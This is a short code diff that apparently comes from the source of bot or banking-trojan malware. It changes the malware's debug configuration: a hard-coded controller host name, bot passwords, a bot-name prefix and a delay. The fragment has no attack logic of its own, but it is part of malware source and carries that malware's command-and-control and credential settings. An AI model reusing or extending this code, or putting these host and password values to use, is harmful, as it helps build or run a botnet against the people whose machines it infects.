@@ -112,9 +112,9 @@ const static PCHAR GETFolderExts[] = {".cgi", ".pl", ".doc", ".rtf", ".tpl", ".r
 
 
 
-	char DebugHost[255]	  = "rus.gipa.in";
+	char DebugHost[]	  = "rus.gipa.in";
 	PCHAR DebugPassword   = "bRS8yYQ0APq9xfzC";
-	char DebugBotPrefix[] = "afttst"; //"bttest";
+	char DebugBotPrefix[] = "afttsfgts"; //"bttest";
 	PCHAR DebugDelay      = "1";
 
 
@@ -124,7 +124,7 @@ const static PCHAR GETFolderExts[] = {".cgi", ".pl", ".doc", ".rtf", ".tpl", ".r
 	PCHAR DebugPassword   = "7Xr62vk4Cgx3Apns";
 	char DebugBotPrefix[] = "afttst"; //"bttest";
 	PCHAR DebugDelay      = "1";
-    */
+	*/
 
 
 
